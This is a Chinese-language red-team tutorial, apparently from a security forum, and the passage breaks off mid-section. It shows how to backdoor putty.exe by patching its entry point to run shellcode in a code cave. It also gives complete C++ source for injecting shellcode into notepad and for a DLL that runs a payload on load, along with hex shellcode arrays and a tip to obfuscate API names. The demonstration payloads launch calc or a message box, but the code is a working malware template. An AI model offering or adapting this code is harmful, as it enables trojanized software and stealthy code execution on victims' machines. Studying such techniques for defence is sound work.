0x01 dbg工具调试 | 植入后门代码
=====================

向程序中植入恶意代码的方法有很多，这里介绍的就是使用dbg工具分析并修改执行流，将后门代码强行植入进目标程序中，这种方式比较硬核，需要具备一定的逆向基本知识和动态调试技术。

下面以向putty.exe中植入后门代码为例

载入目标程序
------

根据不同版本选择对应版本的dbg，在左上角的`File-Open`中打开目标文件，查看入口点。

![LudnAI.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-1b603e6d69df6b36955308de033175b787597043.png)

接下来就是找后门文件可写入的地方（即code cave），这部分要有可执行的权限，因此可以想到`.text`段。一般在`.text`段的末尾都会存在一片未使用的地址空间，前往查看。

![LuduNt.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-ba64c08a62bdce1c0b405ee94350a13ef50ee7c3.png)

修改程序执行流
-------

将入口点处的部分汇编代码备份记录下（以后要用）

```php
00454AD0  | 6A 60               | push 60                  |
00454AD2  | 68 B07A4700         | push putty.477AB0        |
00454AD7  | E8 08210000         | call putty.456BE4        |
00454ADC  | BF 94000000         | mov edi,94               | edi:"LdrpInitializeProcess"
00454AE1  | 8BC7                | mov eax,edi              | edi:"LdrpInitializeProcess"
```

![LudeHA.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-90d4651ce9f314ccfcf3023a7a0a892ca1823f69.png)

修改入口点的汇编代码

```php
jmp 0x0045C961
```

![LudVnH.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-2dd2311effc71ccdabe2c859105767e7a006ba3c.png)

保存现场

在code cave开始处先添加几条命令用于保存现场

```php
pushad
pushfd
```

![LudAje.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-e61d7d1f005c2c45f558fe7423a4a7bebc82a655.png)

插入payload

选定一块区域，右键edit，将payload复制进去

```php
fc e8 82 00 00 00 60 89 e5 31 c0 64
8b 50 30 8b 52 0c 8b 52 14 8b 72 28
0f b7 4a 26 31 ff ac 3c 61 7c 02 2c
20 c1 cf 0d 01 c7 e2 f2 52 57 8b 52
10 8b 4a 3c 8b 4c 11 78 e3 48 01 d1
51 8b 59 20 01 d3 8b 49 18 e3 3a 49
8b 34 8b 01 d6 31 ff ac c1 cf 0d 01
c7 38 e0 75 f6 03 7d f8 3b 7d 24 75
e4 58 8b 58 24 01 d3 66 8b 0c 4b 8b
58 1c 01 d3 8b 04 8b 01 d0 89 44 24
24 5b 5b 61 59 5a 51 ff e0 5f 5f 5a
8b 12 eb 8d 5d 6a 01 8d 85 b2 00 00
00 50 68 31 8b 6f 87 ff d5 bb f0 b5
a2 56 68 a6 95 bd 9d ff d5 3c 06 7c
0a 80 fb e0 75 05 bb 47 13 72 6f 6a
00 53 ff d5 63 61 6c 63 2e 65 78 65
00
```

![LudZBd.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-935c21eefb2e81cf216385427fe50043d7a5d4ad.png)

测试下，将其导出，选择右键`File-Patches`，导出为putty2.exe

![Lud9tx.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-3358bcc7821623acbe21735530f716e8d3baad61.png)

双击putty2.exe，弹出计算器，但是原先的putty程序并没有执行，我们需要建程序执行流调转回去到正常线中。

![LudCh6.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-2299f9a6f8a0bb60aaef640bd2a57a09eebbc308.png)

优化程序执行流
-------

定位函数调用点，跳过或重写

在每一个call调用中设置断点

![LudkcD.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-f1c55b2c535d763b9b7242c280e16b7d7014f469.png)

并且在最后一个call结束之后，程序退出。因此我们添加返回的代码，首先是恢复现场，其次就是将入口点周围汇编代码还原，先将参数压入，再添加跳转代码

> 注意点：跳转目标需距离原先的结尾空两行

```php
00454AD0  | 6A 60               | push 60
00454AD2  | 68 B07A4700         | push putty.477AB0
```

![LudF1O.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-4a7ad3f7980f81ef2d6b880f2ab934331896cdff.png)

patch为putty3.exe，执行后成功弹出计算器

![Ludi9K.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-6173c04b1c6742e3cb1ea498f4b806430d6b0357.png)

0x02 进程注入
=========

> 这部分通过编写cpp源码，将shellcode注入至notepad进程中，以及介绍Process Hacker工具的使用

进程注入指的是将将payload植入到已存在的某个进程中并执行。实现最简单的进程注入一般需要以下几个步骤，

1. 获取目标进程的pid  
    拥有pid可以定位到目标程序
2. 打开该进程并创建一块内存地址
3. 将payload注入进程中并执行

1 获取目标进程PID
-----------

在Win32API中没有提供线程的获取目标进程PID的函数，但可以通过[CreateToolhelp32Snapshot](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot)、[Process32First](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first)、[Process32Next](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next)等函数创建自定义FindTarget函数，用于获取目标程序PID的功能，详细介绍在注释中。

### CreateToolhelp32Snapshot()

`CreateToolhelp32Snapshot()`函数，拍摄指定进程的快照，包括这些进程所使用的堆、模块和线程信息。声明如下：

```cpp
HANDLE CreateToolhelp32Snapshot(
    DWORD dwFlags,
    DWORD th32ProcessID
);
```

- dwFlags指定快照中需要包含的系统部分，TH32CS\_SNAPPROCESS表示包含系统中所有进程
- th32ProcessID指的是包含在快照中进程的SID，0表示当前进程

调用如下：（拍摄了当前系统下的所有进程信息）

```cpp
hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
```

### Process32First()

使用`Process32First()`函数判断快照是否拍摄成功，声明如下：

```cpp
BOOL Process32First(
    HANDLE           hSnapshot,
    LPPROCESSENTRY32 lppe
);
```

- hSnapshot指定快照
- lppe指向一个PROCESSENTRY32结构体，输出包含进程信息包括名称、SID等

本例中的调用：

```cpp
if (!Process32First(hProcSnap, &pe32)) {
    CloseHandle(hProcSnap);
    return 0;
}
```

### Process32Next()

使用`Process32Next()`函数用以检索系统快照中记录的下一个进程的信息。

```cpp
BOOL Process32Next(
    HANDLE           hSnapshot,
    LPPROCESSENTRY32 lppe
);
```

- hSnapshot指定快照
- lppe指向一个PROCESSENTRY32结构体，输出包含进程信息包括名称、SID等

本例中的调用：**循环遍历快照，比较每个进程的名字，匹配成功后返回SID值**

```cpp
while (Process32Next(hProcSnap, &pe32)) {
    if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
        pid = pe32.th32ProcessID;
        break;
    }
}
```

### PROCESSENTRY32 结构体

PROCESSENTRY32结构体，是一个描述了快照中进程信息的条目[PROCESSENTRY32 | Microsoft Docs](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-processentry32)

本例中就使用到了其中几个信息：

- dwSize结构体大小
- th32ProcessID进程标识符（SID）
- szExeFile表示可执行文件的名称

### FindTarget函数完整代码

```cpp
int FindTarget(const char *procname) {

    // PROCESSENTRY32描述快照拍摄时,驻留在系统地址空间的进程列表中的一个条目
    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
    int pid = 0;
    // CreateToolhelp32Snapshot()拍摄指定进程的快照
    // TH32CS_SNAPPROCESS包括快照中系统的所有进程
    // 返回句柄
    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcSnap) return 0;    // 拍摄快照失败，返回0

    pe32.dwSize = sizeof(PROCESSENTRY32);   // 结构大小

    // 检索快照中的信息
    // 判定快照是否为空
    if (!Process32First(hProcSnap, &pe32)) {
        CloseHandle(hProcSnap);
        return 0;
    }
    // Process32Next()循环检索快照信息  
    // 参数1是快照的句柄，参数2是指向PROCESSENTRY32数据结构的指针
    // lstrcmpiA()比较两个字符，相等返回0，将对应进程的pid返回
    while (Process32Next(hProcSnap, &pe32)) {
        if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    }
    CloseHandle(hProcSnap);
    return pid;
}
```

2 打开目标进程
--------

Win32Api提供了`OpenProcess()`函数用于**打开进程并返回该程序的句柄** [OpenProcess | Microsoft Docs](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess)

```cpp
HANDLE OpenProcess(
    DWORD dwDesiredAccess,
    BOOL  bInheritHandle,
    DWORD dwProcessId
);
```

- dwDesiredAccess指定进程对象的访问权限，具有[这几种](https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)，PROCESS\_ALL\_ACCESS表示所有访问权
- bInheritHandle设置继承属性，False表示不继承
- dwProcessId指的是进程标识符pid

本例中的调用如下：

```cpp
hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, (DWORD) pid);
```

3 开辟内存地址
--------

`VirtualAllocEx()`可以在指定进程中开辟一块内存区域[VirtualAllocEx | Microsoft Docs](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)

> 与VirtualAlloc函数不同的是，VirtualAllocEX函数开辟的是另一个进程中的内存空间，参数多了一个hProcess（指定目标进程）

```cpp
LPVOID VirtualAllocEx(
    HANDLE hProcess,
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flAllocationType,
    DWORD  flProtect
);
```

- hProcess指目标进程句柄
- lpAddress指定分配起始地址，NULL表示由系统决定
- dwSize指定分配内存大小，这里就是指DLL的大小
- flAllocationType指定分配的内存类型，MEM\_COMMIT表示分配保留下，但是未使用
- flProtect指定分配缓冲区的保护措施（权限），PAGE\_READWRITE表示可读可写

调用如下：

```cpp
pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
```

4 注入payload
-----------

Win32API中提供了`WriteProcessMemory()`函数**向目标区域写入数据** [WriteProcessMemory | Microsoft Docs](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)

```cpp
BOOL WriteProcessMemory(
    HANDLE  hProcess,
    LPVOID  lpBaseAddress,
    LPCVOID lpBuffer,
    SIZE_T  nSize,
    SIZE_T  *lpNumberOfBytesWritten
);
```

- hProcess指定目标进程句柄
- lpBaseAddress指定数据写入的起始地址，写入地址为新开辟的缓冲区remBuf
- lpBuffer指定数据所在地址，即我们的dll
- nSize表示写入数据大小
- \*lpNumberOfBytesWritten将传输的数据量写出，NULL表示忽略此参数

本例调用如下：

```cpp
// WriteProcessMemory()将数据写到指定进程中的一个内存区域
// (目标进程，写入的起始地址，写入的数据，写入大小)
WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL);
```

5 执行payload
-----------

Win32Api提供了`CreateRemoteThread()`用于**创建远程线程**，即控制其它进程来创建运行一个新线程[CreateRemoteThread | Microsoft Docs](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)

> 与CreateThread函数区别在于，CreateRemoteThread函数是针对另一个进程创建线程

```cpp
HANDLE CreateRemoteThread(
    HANDLE                 hProcess,        
    LPSECURITY_ATTRIBUTES  lpThreadAttributes,
    SIZE_T                 dwStackSize,     
    LPTHREAD_START_ROUTINE lpStartAddress,  
    LPVOID                 lpParameter,     
    DWORD                  dwCreationFlags, 
    LPDWORD                lpThreadId       
);
```

- hProcess指定目标进程句柄
- lpThreadAttributes设置线程属性，通常设为NULL
- dwStackSize指定线程栈初始大小，0表示默认大小1MB
- lpStartAddress指定待执行的函数
- lpParameter指定传送给线程的变量
- dwCreationFlags表示线程创建标志，通常设为0
- lpThreadId返回线程ID，一般设置为NULL

本例调用如下：

```cpp
// CreateRemoteThread()创建一个在另一个进程的虚拟地址空间中运行的线程
hThread = CreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);
    if (hThread != NULL) {
        // 等待0.5秒
        WaitForSingleObject(hThread, 500);
        CloseHandle(hThread);
        return 0;
    }
```

进程注入完整代码
--------

```cpp
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

// MessageBox shellcode - 64-bit
unsigned char payload[] = {
  0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xd0, 0x00, 0x00,
  0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65,
  0x48, 0x8b, 0x52, 0x60, 0x3e, 0x48, 0x8b, 0x52, 0x18, 0x3e, 0x48, 0x8b,
  0x52, 0x20, 0x3e, 0x48, 0x8b, 0x72, 0x50, 0x3e, 0x48, 0x0f, 0xb7, 0x4a,
  0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02,
  0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52,
  0x41, 0x51, 0x3e, 0x48, 0x8b, 0x52, 0x20, 0x3e, 0x8b, 0x42, 0x3c, 0x48,
  0x01, 0xd0, 0x3e, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0,
  0x74, 0x6f, 0x48, 0x01, 0xd0, 0x50, 0x3e, 0x8b, 0x48, 0x18, 0x3e, 0x44,
  0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x5c, 0x48, 0xff, 0xc9, 0x3e,
  0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31,
  0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75,
  0xf1, 0x3e, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd6,
  0x58, 0x3e, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x3e, 0x41,
  0x8b, 0x0c, 0x48, 0x3e, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x3e,
  0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e,
  0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20,
  0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x3e, 0x48, 0x8b, 0x12,
  0xe9, 0x49, 0xff, 0xff, 0xff, 0x5d, 0x49, 0xc7, 0xc1, 0x00, 0x00, 0x00,
  0x00, 0x3e, 0x48, 0x8d, 0x95, 0x1a, 0x01, 0x00, 0x00, 0x3e, 0x4c, 0x8d,
  0x85, 0x35, 0x01, 0x00, 0x00, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x45, 0x83,
  0x56, 0x07, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6,
  0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c,
  0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a,
  0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x48, 0x69, 0x20, 0x66, 0x72,
  0x6f, 0x6d, 0x20, 0x52, 0x65, 0x64, 0x20, 0x54, 0x65, 0x61, 0x6d, 0x20,
  0x4f, 0x70, 0x65, 0x72, 0x61, 0x74, 0x6f, 0x72, 0x21, 0x00, 0x52, 0x54,
  0x4f, 0x3a, 0x20, 0x4d, 0x61, 0x6c, 0x44, 0x65, 0x76, 0x00
};
unsigned int payload_len = 334;

int FindTarget(const char *procname) {

        // PROCESSENTRY32描述快照拍摄时,驻留在系统地址空间的进程列表中的一个条目
        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;
        // CreateToolhelp32Snapshot()拍摄指定进程的快照
        // TH32CS_SNAPPROCESS包括快照中系统的所有进程
        // 返回句柄
        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;    // 拍摄快照失败，返回0

        pe32.dwSize = sizeof(PROCESSENTRY32);   // 结构大小

        // 检索快照中的信息
            // 判定快照是否为空
        if (!Process32First(hProcSnap, &pe32)) {
                CloseHandle(hProcSnap);
                return 0;
        }
            // Process32Next()循环检索快照信息  
            // 参数1是快照的句柄，参数2是指向PROCESSENTRY32数据结构的指针
            // lstrcmpiA()比较两个字符，相等返回0，将对应进程的pid返回
        while (Process32Next(hProcSnap, &pe32)) {
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }

        CloseHandle(hProcSnap);

        return pid;
}

int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {

        LPVOID pRemoteCode = NULL;
        HANDLE hThread = NULL;

        // VirtualAllocEx()改变一个指定进程的虚拟地址空间中的存区域的状态
        // (进程句柄，起始地址，分配的内存大小，内存分配的类型，分配内存的权限)
        pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);

        // WriteProcessMemory()将数据写到指定进程中的一个内存区域
        // (目标进程，写入的起始地址，写入的数据，写入大小)
        WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL);

        // CreateRemoteThread()创建一个在另一个进程的虚拟地址空间中运行的线程
        hThread = CreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);
        if (hThread != NULL) {
                // 等待0.5秒
                WaitForSingleObject(hThread, 500);
                CloseHandle(hThread);
                return 0;
        }
        return -1;
}

int main(void) {

    int pid = 0;
    HANDLE hProc = NULL;
    // 获取目标进程PID
    pid = FindTarget("notepad.exe");

    if (pid) {
        printf("Notepad.exe PID = %d\n", pid);

        // try to open target process
        // 打开进程后返回句柄
        // OpenProcess(访问的权限，继承，pid)
        hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
                        PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
                        FALSE, (DWORD) pid);

        if (hProc != NULL) {
            Inject(hProc, payload, payload_len);
            CloseHandle(hProc);
        }
    }
    return 0;
}
```

编译执行，成功弹出窗口

![LudJBj.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-d744ae838e836dfb8410043817dcf1626353076c.png)

思维拓展：我们这里使用的函数名可以结合之前知识点进行混淆处理

Process Hacker工具 | 过程分析
-----------------------

### 查看payload注入成功

使用工具中的`Find window and thread`功能

![LudUNq.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-7684b8917d62fa677ad7aa2805a326da7603e816.png)

### 查看payload在内存中的位置

在Memory中查看可执行的内存地址，发现一处使用者为空白的地址

![LudYHs.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-af1f5341cd7387d72a1528df515085c90dade7c2.png)

双击查看，其中显示的就是我们的shellcode

![LudNEn.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-e516b5cc2b8cc01da2ad615864191b62a979e8b2.png)

0x03 经典DLL注入
============

DLL注入，简而言之就是**向一个运行的进程注入代码**的过程。其中最简单的例子莫过于Classical DLL Inject，包括两部分：

1. 控制payload的执行
2. 注入payload至进程中

控制payload的执行
------------

首先要清楚的是payload如何执行起来，阅读过之前文章的就可以联想到payload的执行无外乎就那几个Win32api的调用，其次就是如何DLL函数，巧了也是之前的文章有介绍到。这里就是将前面文章的payload执行和DLL函数创建两项技术结合起来（顺带复习了哈~~）

源码主要包括几个功能部分

1. 执行payload的函数
2. DllMain函数（类似main函数）
3. payload

### 1 执行payload的函数

和前几章学过的代码类似，执行payload主要包括：分配新的内存空间（缓冲区），拷贝payload至缓冲区，修改缓冲区权限，最后就是执行。因此也是利用`VirtualAlloc、RtlMoveMemory、VirtualProtect、CreateThread`这几个函数实现

> TIPS：可以结合混淆内容（可以练练手，多做）

实现代码如下：

```cpp
int Go(void) {
    void * exec_mem;
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;
    // 分配空间
    exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    // 拷贝shellcode至目标地址空间
    RtlMoveMemory(exec_mem, payload, payload_len);
    // 修改权限为可执行
    rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
    // 创建线程执行
    if ( rv != 0 ) {
            th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
            WaitForSingleObject(th, 0);
    }
    return 0;
}
```

### 2 DllMain函数

> 这部分之前也介绍过，不过当时是没有任何操作的

DllMain函数是**DLL模块的默认入口点**。 当系统启动或终止进程或线程时，它将使用进程的第一个线程为每个加载的 DLL 调用入口点函数。MSDN给出了关于[DllMain 入口点](https://docs.microsoft.com/zh-cn/windows/win32/dlls/dllmain)很详细的示例。

源码中，在进程初始化阶段添加了`Go()`函数（执行paylaod的函数），表示DLL被载入执行操作过程中`Go()`函数会被执行

```cpp
BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved ) {
    switch ( fdwReason ) {
            // 新进程初始化操作，将该DLL加载到当前进程的虚拟地址空间，执行Go函数
            case DLL_PROCESS_ATTACH:
                    Go();
                    break;
            case DLL_THREAD_ATTACH:     
                    break;
            case DLL_THREAD_DETACH:     
                    break;
            case DLL_PROCESS_DETACH:    
                    break;
            }
    return TRUE;
}   
```

### 3 payload

见下方完整代码中

```cpp
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Calc.exe shellcode (exit function = thread)
unsigned char payload[] = {
  0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51,
  0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52,
  0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72,
  0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
  0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
  0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b,
  0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
  0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
  0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41,
  0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
  0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1,
  0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
  0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44,
  0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01,
  0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
  0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
  0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48,
  0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d,
  0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5,
  0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
  0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0,
  0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89,
  0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
};
unsigned int payload_len = 276;

extern __declspec(dllexport) int Go(void);
// 定义Go函数，执行上述payload
int Go(void) {

    void * exec_mem;
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;
    exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    RtlMoveMemory(exec_mem, payload, payload_len);
    rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
    if ( rv != 0 ) {
            th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
            WaitForSingleObject(th, 0);
    }
    return 0;
}

// Dll主函数
BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved ) {
    switch ( fdwReason ) {
            // 新进程初始化操作，执行Go函数
            case DLL_PROCESS_ATTACH:
                    Go();
                    break;
            case DLL_THREAD_ATTACH:
                    break;
            case DLL_THREAD_DETACH:
                    break;
            case DLL_PROCESS_DETACH:
                    break;
            }
    return TRUE;
}
```

注入payload至进程中
-------------

创建好DLL后，接下来就是将DLL注入至目标进程并运行起来。注入操作分为几个部分（思路）：

- 找到目标进程并打开  
    Win32API提供了`OpenProcess()`函数，但在其参数中需要指定pid，没有现成的获取pid函数，自己构造呗~，利用`CreateToolhelp32Snapshot()`将目前进程镜像拷贝，再遍历名称得到pid，有了pid那就可以打开目标进程了
- 在进程中分配空间写入DLL  
    分配和写入可通过`VirtualAllocEx()`和`WriteProcessMemory()`实现
- 创建线程执行载入操作  
    创建线程可以通过`CreateRemoteThread()`实现

### 1 找到目标进程并打开

Win32Api提供了`OpenProcess()`函数用于打开进程，[OpenProcess | Microsoft Docs](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess) 声明如下：

```cpp
HANDLE OpenProcess(
    DWORD dwDesiredAccess,
    BOOL  bInheritHandle,
    DWORD dwProcessId
);
```

- dwDesiredAccess指定进程对象的访问权限，具有[这几种](https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)，PROCESS\_ALL\_ACCESS表示所有访问权
- bInheritHandle设置继承属性，False表示不继承
- dwProcessId指的是进程标识符pid

本例中的调用如下：

```cpp
pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)(pid));
```

PID的获取则可以通过之前介绍的`FindTarget()`函数：参考之前文章

```cpp
int FindTarget(const char *procname) {
        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;   
        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;      
        pe32.dwSize = sizeof(PROCESSENTRY32);        
        if (!Process32First(hProcSnap, &pe32)) {
                CloseHandle(hProcSnap);
                return 0;
        }        
        while (Process32Next(hProcSnap, &pe32)) {
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }      
        CloseHandle(hProcSnap);              
        return pid;
}
```

### 2 分配空间写入DLL

Win32Api中提供`VirtualAllocEx()`函数指定在目标进程中分配内存空间。[VirtualAllocEx | Microsoft Docs](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)

> 与VirtualAlloc函数不同，VirtualAllocEx函数用于对**其他进程**的内存分配

```cpp
LPVOID VirtualAllocEx(
    HANDLE hProcess,
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flAllocationType,
    DWORD  flProtect
);
```

- hProcess指目标进程句柄
- lpAddress指定分配起始地址，NULL表示由系统决定
- dwSize指定分配内存大小，这里就是指DLL的大小
- flAllocationType指定分配的内存类型，MEM\_COMMIT表示分配保留下，但是未使用
- flProtect指定分配缓冲区的保护措施（权限），PAGE\_READWRITE表示可读可写

本例的调用：

```cpp
remBuf = VirtualAllocEx(pHandle, NULL, sizeof(dll), MEM_COMMIT, PAGE_READWRITE);
```

Win32Api中提供`WriteProcessMemory()`函数，向指定进程的内存中写入数据[WriteProcessMemory | Microsoft Docs](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) 声明如下：

```cpp
BOOL WriteProcessMemory(
    HANDLE  hProcess,
    LPVOID  lpBaseAddress,
    LPCVOID lpBuffer,
    SIZE_T  nSize,
    SIZE_T  *lpNumberOfBytesWritten
);
```

- hProcess指定目标进程句柄
- lpBaseAddress指定数据写入的起始地址，写入地址为新开辟的缓冲区remBuf
- lpBuffer指定数据所在地址，即我们的dll
- nSize表示写入数据大小
- \*lpNumberOfBytesWritten将传输的数据量写出，NULL表示忽略此参数

本例中的调用：

```php
WriteProcessMemory(pHandle, remBuf, (LPVOID) dll, sizeof(dll), NULL);
```

### 3 执行线程

